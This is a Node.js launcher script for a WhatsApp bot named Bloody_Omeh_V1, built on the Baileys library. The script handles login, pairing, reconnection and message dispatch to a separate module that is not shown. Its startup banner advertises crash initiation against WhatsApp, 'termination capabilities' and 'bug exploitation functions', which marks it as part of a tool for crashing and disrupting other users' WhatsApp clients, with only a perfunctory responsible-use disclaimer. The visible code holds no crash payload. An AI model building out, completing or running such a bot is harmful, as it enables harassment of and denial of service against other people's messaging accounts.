
console.clear();
console.log('Starting...');
require('../setting/config');

const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    jidDecode, 
    proto, 
    relayWAMessage, 
    getContentType, 
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");

const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const { Boom } = require('@hapi/boom');
const { color } = require('./lib/color');
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');


const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
}


const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

async function badstart() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    console.log(`A sophisticated WhatsApp bot, meticulously updated by King Pussy and King Badboi, boasts an array of cutting-edge features.

Key Functionalities:
Indefinite WhatsApp crash initiation
WhatsApp termination capabilities
Advanced bug exploitation functions

Important Notice:
Please utilize this bot responsibly and with caution, as improper usage may inadvertently lead to spamming  
Responsible usage ensures a seamless and efficient experience for all parties involved. Misuse, however, may result in severe consequences, including but not limited to:
Account suspension or termination
IP blocking
Legal repercussions
To avoid such outcomes, please adhere to the following guidelines:
Use the bot for legitimate purposes only
Refrain from spamming or harassing others
Comply with WhatsApp's terms of service
By using this bot, you acknowledge that you have read, understood, and agreed to these terms`)
    const bad = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !global.usePairingCode,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });
   
      if (global.usePairingCode && !bad.authState.creds.registered) {
        const phoneNumber = await question('please enter your WhatsApp number, starting with 234:\n');
        const code = await bad.requestPairingCode(phoneNumber.trim());
        console.log(`Bloody_Omeh_V1 $ 𝐩𝐚𝐢𝐫𝐢𝐧𝐠 : ${code}`);
    }   

    store.bind(bad.ev);
bad.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!bad.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(bad, mek, store)
require("./Bloody_Omeh_V1")(bad, m, chatUpdate, store)
 } catch (err) {
 console.log(err)
 }
});

    bad.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    bad.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = bad.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    bad.public = false;

    bad.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`Bad Session File, Please Delete Session and Scan Again`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'));
                bad.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                console.log(color(`Device Logged Out, Please Scan Again And Run.`));
                bad.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                console.log(color('Restart Required, Restarting...'));
                await badstart();
            } else if (reason === DisconnectReason.timedOut) {
                console.log(color('Connection TimedOut, Reconnecting...'));
                badstart();
            }
        } else if (connection === "connecting") {
            console.log(color('Connecting please wait ✋️ . . . '));
        } else if (connection === "open") {
            let teksnotif = `*Bloody_Omeh_V1 ⃟⃟⃟ Bot Successfully Connected To ${bad.user.id.split(":")[0]}`
bad.sendMessage(global.owner+"@s.whatsapp.net", {text: teksnotif})
console.log(color('Bot Connected Successfully'))
        }
    });

    bad.sendText = (jid, text, quoted = '', options) => bad.sendMessage(jid, { text: text, ...options }, { quoted });
    
    bad.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    bad.ev.on('creds.update', saveCreds);
    return bad;
}

badstart();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
